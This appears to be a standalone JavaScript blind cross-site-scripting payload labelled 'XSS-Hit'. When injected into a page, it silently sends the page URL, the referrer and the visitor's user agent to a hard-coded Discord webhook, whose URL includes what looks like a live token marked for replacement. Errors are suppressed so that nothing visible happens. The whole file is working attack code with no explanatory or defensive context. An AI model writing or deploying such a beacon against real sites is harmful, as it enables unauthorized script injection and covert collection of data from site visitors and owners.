(function(){
  try {
    const webhook = "https://discordapp.com/api/webhooks/1435106041175081031/sEEPIQ7p60XPVA609k4WNz_ZbVtqbjzjaeygiwdRuvrTDi7XCrncUluQKgzyIADtDJea?wait=true"; // REPLACE
    const payload = {
      username: "XSS-Hit",
      content: [
        `Hit: ${location.href}`,
        `Referrer: ${document.referrer || "(none)"}`,
        `UA: ${navigator.userAgent}`
      ].join("\n")
    };
    // POST to Discord (best-effort; ignore errors)
    fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    }).catch(()=>{});
  } catch(e){}
})();
